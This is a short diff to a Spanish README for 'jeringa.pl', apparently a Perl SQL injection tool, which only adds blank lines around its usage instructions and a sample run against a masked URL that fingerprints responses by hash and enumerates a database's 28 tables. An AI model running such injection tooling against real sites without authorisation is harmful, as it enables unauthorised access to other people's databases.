@@ -21,6 +21,7 @@ Uso de la Jeringa:
 Solo agregar entre comillas la URL que queremos verificar su vulnerabilidad, incluyendo las variables en la url, que es donde se hará en si la prueba de inyección.
 
 -----------------------------------------------------------------------
+
 ciskosv@BlackAvenger:~/$ perl jeringa.pl "http://www.###./?art=1234"
 Obteniendo hashes...
 Hash verdadero: 6f337c327ce461481c36b628613300b2
@@ -38,6 +39,7 @@ xxxxxxxxx
 
 Obteniendo cantidad de tablas que tiene la BD...1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
 La BD tiene 28 tablas
+
 -----------------------------------------------------------------------
 
 
